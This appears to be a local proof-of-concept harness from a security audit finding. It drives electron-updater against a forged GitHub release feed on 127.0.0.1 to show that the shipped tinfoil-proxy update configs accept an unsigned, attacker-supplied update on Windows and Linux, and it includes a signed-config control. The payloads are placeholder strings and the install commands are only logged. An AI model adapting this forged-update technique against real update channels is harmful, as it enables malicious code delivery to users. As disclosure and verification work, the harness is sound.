// Finding 15, part B (local only). Drives the real electron-updater 6.8.9 with the app-update.yml
// files shipped in tinfoil-proxy v0.2.3, against a fake GitHub release feed on 127.0.0.1.
// Distilled from a verifier's harness. Differences from a real install:
//  (1) `host:`/`protocol:` are appended to a COPY of the shipped app-update.yml so the GitHub
//      provider talks to 127.0.0.1 over HTTP instead of https://github.com;
//  (2) Electron's net-based HTTP executor is replaced by a Node http executor;
//  (3) the commands that would install the update are recorded, not run;
//  (4) Windows Authenticode (PowerShell Get-AuthenticodeSignature) cannot run on Linux, so
//      verifyUpdateCodeSignature is replaced by a counter that reports "not signed", which is
//      what Windows returns for this unsigned payload. The bug is that it is never called.
// Usage: node harness.cjs <win app-update.yml> <deb app-update.yml> <run dir>
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { HttpExecutor, configureRequestUrl, configureRequestOptions } = require('builder-util-runtime');
const { DebUpdater, NsisUpdater } = require('electron-updater');

const [WIN_CFG, DEB_CFG, RUN] = process.argv.slice(2);
fs.rmSync(RUN, { recursive: true, force: true });

const payloadDeb = Buffer.from('ATTACKER-DEB-PAYLOAD (not a signed package)\n');
const payloadExe = Buffer.from('MZ ATTACKER-EXE-PAYLOAD (no Authenticode signature)\n');
const sha = (b) => crypto.createHash('sha512').update(b).digest('base64');
const TAG = 'v9.9.9';
const yml = (name, b) => `version: 9.9.9\nfiles:\n  - url: ${name}\n    sha512: ${sha(b)}\n    size: ${b.length}\npath: ${name}\nsha512: ${sha(b)}\nreleaseDate: '2026-10-11T00:00:00.000Z'\n`;
const routes = {
  '/tinfoilsh/tinfoil-proxy/releases.atom': ['application/atom+xml',
    `<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom"><entry><id>tag:github.com,2008:Repository/1/${TAG}</id><updated>2026-10-11T00:00:00Z</updated><link rel="alternate" type="text/html" href="http://127.0.0.1/tinfoilsh/tinfoil-proxy/releases/tag/${TAG}"/><title>${TAG}</title><content type="html">forged</content></entry></feed>`],
  '/api/v3/repos/tinfoilsh/tinfoil-proxy/releases/latest': ['application/json', JSON.stringify({ tag_name: TAG })],
  [`/tinfoilsh/tinfoil-proxy/releases/download/${TAG}/latest-linux.yml`]: ['text/yaml', yml('tinfoil-proxy_amd64.deb', payloadDeb)],
  [`/tinfoilsh/tinfoil-proxy/releases/download/${TAG}/latest.yml`]: ['text/yaml', yml('Tinfoil-Proxy-Setup.exe', payloadExe)],
  [`/tinfoilsh/tinfoil-proxy/releases/download/${TAG}/tinfoil-proxy_amd64.deb`]: ['application/octet-stream', payloadDeb],
  [`/tinfoilsh/tinfoil-proxy/releases/download/${TAG}/Tinfoil-Proxy-Setup.exe`]: ['application/octet-stream', payloadExe],
};
const server = http.createServer((req, res) => {
  const r = routes[new URL(req.url, 'http://x').pathname];
  if (!r) { res.writeHead(404); return res.end(); }
  res.writeHead(200, { 'content-type': r[0], 'content-length': Buffer.byteLength(r[1]) });
  res.end(r[1]);
});

class NodeExecutor extends HttpExecutor { // same shape as ElectronHttpExecutor.download
  async download(url, destination, options) {
    return options.cancellationToken.createPromise((resolve, reject, onCancel) => {
      const o = { headers: options.headers || undefined, redirect: 'manual' };
      configureRequestUrl(url, o); configureRequestOptions(o);
      this.doDownload(o, { destination, options, onCancel, callback: (e) => (e == null ? resolve(destination) : reject(e)), responseHandler: null }, 0);
    });
  }
  createRequest(options, cb) { const r = http.request(options); r.on('response', cb); return r; }
}

function makeApp(cfg, dir) {
  const q = [];
  return { version: '0.2.3', name: 'Tinfoil Proxy', isPackaged: true, appUpdateConfigPath: cfg,
    userDataPath: path.join(dir, 'userData'), baseCachePath: path.join(dir, 'cache'),
    whenReady: async () => {}, relaunch() {}, quit() {}, onQuit(h) { q.push(h); }, fireQuit(c) { q.forEach((h) => h(c)); } };
}
const quiet = { info() {}, warn() {}, error() {}, debug: null };

function prepareCfg(shipped, dir, port, extra = '') {
  fs.mkdirSync(dir, { recursive: true });
  const out = path.join(dir, 'app-update.yml');
  fs.writeFileSync(out, fs.readFileSync(shipped, 'utf8').trimEnd() + extra + `\nhost: 127.0.0.1:${port}\nprotocol: http\n`);
  return out;
}

async function run(kind, shipped, port, extraCfg, label) {
  const dir = path.join(RUN, label);
  const cfg = prepareCfg(shipped, dir, port, extraCfg);
  const app = makeApp(cfg, dir);
  const u = kind === 'deb' ? new DebUpdater(null, app) : new NsisUpdater(null, app);
  if (kind === 'nsis') u._testOnlyOptions = { platform: 'win32' }; // pick latest.yml as on Windows
  Object.assign(u, { httpExecutor: new NodeExecutor(), updateConfigPath: cfg, logger: quiet, autoDownload: true, autoInstallOnAppQuit: true }); // updater.ts:13-14
  const recorded = [];
  let authenticode = 0;
  if (kind === 'deb') {
    u.isRunningAsRoot = () => false;
    const have = new Set(['dpkg', 'apt', 'pkexec', 'sudo']);
    u.spawnSyncLog = (cmd, args = []) => {
      if (cmd === 'command' && args[0] === '-v') { if (have.has(args[1])) return '/usr/bin/' + args[1]; throw new Error('missing'); }
      recorded.push([cmd, ...args].join(' ')); return '';
    };
  } else {
    process.resourcesPath = 'C:\\Users\\victim\\AppData\\Local\\Programs\\tinfoil-proxy\\resources';
    u.verifyUpdateCodeSignature = async (names) => { authenticode++; return `New version is not signed by the application owner: publisherNames: ${names.join(', ')}`; };
    u.spawnLog = async (cmd, args = []) => { recorded.push([cmd, ...args].join(' ')); return true; };
  }
  let info = null; let err = null;
  u.on('update-downloaded', (i) => { info = i; });
  try { const r = await u.checkForUpdates(); await r.downloadPromise; } catch (e) { err = e.message.split('\n')[0]; }
  const tag = `[${label}]`;
  if (kind === 'nsis') console.log(`${tag} Authenticode verifier calls: ${authenticode}`);
  if (!info) { console.log(`${tag} update REJECTED: ${err}`); return; }
  const payload = kind === 'deb' ? payloadDeb : payloadExe;
  console.log(`${tag} update-downloaded version=${info.version}; file is the attacker payload: ${Buffer.compare(fs.readFileSync(info.downloadedFile), payload) === 0}`);
  app.fireQuit(0); // autoInstallOnAppQuit
  for (const c of recorded) console.log(`${tag} install command on quit: ${c.replace(RUN, '<run>')}`);
}

(async () => {
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  console.log(`fake GitHub feed on 127.0.0.1:${port}; forged release ${TAG} with self-consistent sha512`);
  await run('nsis', WIN_CFG, port, '', 'windows-shipped-config');
  await run('deb', DEB_CFG, port, '', 'linux-shipped-config');
  // Negative control: the same feed, but app-update.yml carries a publisherName (what a signed
  // Windows build gets). electron-updater now runs the Authenticode check and refuses the payload.
  await run('nsis', WIN_CFG, port, '\npublisherName:\n  - Tinfoil Systems, Inc.', 'control-windows-with-publisherName');
  server.close();
})().catch((e) => { console.error('HARNESS ERROR', e); process.exit(1); });
